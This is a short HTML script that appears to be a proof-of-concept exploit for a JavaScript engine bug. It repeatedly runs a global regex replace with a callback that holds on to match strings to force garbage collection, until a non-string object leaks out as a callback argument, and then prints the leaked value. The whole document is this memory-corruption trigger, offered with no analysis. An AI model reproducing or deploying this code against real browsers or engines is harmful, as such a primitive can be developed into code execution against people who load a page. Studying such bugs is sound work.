<script>

function repeat(str, n){
    var ret = "";
    for(var i = 0; i < n; i++)
        ret += str;
    return ret;
}

function i_want_to_break_free() {
    var n = 0x1000;
    var m = 10;
    var regex = new RegExp(repeat("ab", n), "g"); // g flag to trigger the vulnerable path
    var part = repeat("ab", n); // matches have to be at least size 2 to prevent interning
    var s = repeat((part + "|"), m);
    while (true) {
        var cnt = 0;
        var ary = [];
        s.replace(regex, function() {
            for (var i = 1; i < arguments.length-2; ++i) {
                if (typeof arguments[i] !== 'string') {
                    i_am_free = arguments[i];
                    throw "success";
                }
                ary[cnt++] = arguments[i];  // root everything to force GC
            }
            return "x";
        });
    }
}

try { i_want_to_break_free(); } catch (e) { console.log(e); }
console.log(i_am_free);
console.log(typeof(i_am_free));
</script>
